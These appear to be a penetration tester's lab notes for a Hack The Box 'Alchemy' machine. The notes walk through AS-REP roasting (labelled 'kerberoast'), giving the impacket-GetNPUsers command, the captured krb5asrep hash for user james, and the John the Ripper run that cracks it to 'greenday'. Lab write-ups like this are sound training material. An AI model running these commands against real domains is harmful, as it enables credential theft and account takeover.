### Kerberoast
#kerberoast
- If you have usernames, you can kerberoast the DC with a userfile to get a krb5asrep hash. Once you have this hash you can break it utilizing `john`
- to kerberoast `impacket-GetNPUsers` seems reliable, I utilized Rubeus originally but it gave a false negative - possibly a user error maybe to not providing an appropriate userlist.
- put the full hash in a file named`hashlist`
```bash
┌──(root💀gobots)-[21Jun2024 19:01:00]-[/home/kali/SUT/Alchemy]                                                    
└─# proxychains impacket-GetNPUsers  -usersfile "userlist" -dc-host "dc.alchemy.htb" "alchemy.htb"/                
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                             
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] User calde_ldap doesn't have UF_DONT_REQUIRE_PREAUTH set                                                       
[-] User calde_ldap@alchemy.htb doesn't have UF_DONT_REQUIRE_PREAUTH set                                           
[-] User calde doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User aepike doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User aepike@alchemy.htb doesn't have UF_DONT_REQUIRE_PREAUTH set                                               
[-] User thanos doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$james@ALCHEMY.HTB:5c0e5f49eef42e4d34db45499c6c6152$a912a376f7cf252fe58719fab2c9770cec85c6dec677908ab0a11acaa3136ec3bd983481ef13f9c8cfd434afd7c331ca315332f8e602ca687406b0b5debf2f3803e984391fc1a636b82e9b667dc9a754ec613
5cbe607b2ce496c03fe90b117f21e3ef5e9500da39d50f7f74ab5748a3c16d84ff8204b1b4d45fbcb80242fe35fa1e55d5bff0b4f33c2a8ca6acbffb56e4f18f4be1b698f1588dcfdc801441df74e3d4059eb28464efe19beebb245e362d0fbdf9cd1fc0713bec926fb3a2e11ede05ff72d7fd
ae5574e7444bee1368d61a85c4289541754ac406dffefddbe833a65d889a1d5ddf7d10e80                                          
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set                   
```
#### John the ripper - Password Cracking
#john
- get the password greenday
```bash
┌──(root💀gobots)-[21Jun2024 19:14:27]-[/home/kali/SUT/Alchemy/172.16.0.2]
└─# john --format=krb5asrep --wordlist=rockyou.txt hashlist
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads                                
Press 'q' or Ctrl-C to abort, almost any other key for status
greenday         ($krb5asrep$23$james@ALCHEMY.HTB)     
1g 0:00:00:00 DONE (2024-06-21 19:14) 100.0g/s 102400p/s 102400c/s 102400C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed.                     
```